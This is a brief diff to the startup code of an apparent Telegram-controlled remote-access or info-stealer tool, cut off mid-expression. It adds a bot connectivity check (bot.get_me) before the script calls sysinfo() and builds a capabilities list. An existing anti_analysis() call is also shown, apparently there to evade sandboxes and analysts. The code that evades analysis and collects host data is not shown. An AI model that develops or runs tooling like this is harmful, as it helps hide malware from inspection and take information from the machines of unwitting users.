@@ -1,6 +1,7 @@
 import sys
 import os
 import logging
+import time
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -14,11 +15,24 @@ except Exception as e:
     log.error("import failed: %s", e)
     raise
 
+def check_bot() -> bool:
+    try:
+        me = bot.get_me()
+        log.info("bot ok: @%s (%s)", me.username, me.id)
+        return True
+    except Exception as e:
+        log.error("bot.get_me failed: %s", e)
+        return False
+
 if __name__ == "__main__":
     try:
         anti_analysis()
     except Exception as e:
         log.warning("anti_analysis failed: %s", e)
+    if not check_bot():
+        log.error("cannot reach Telegram. check token, network, or proxy")
+        time.sleep(5)
+        sys.exit(1)
     try:
         info = sysinfo()
         caps = (
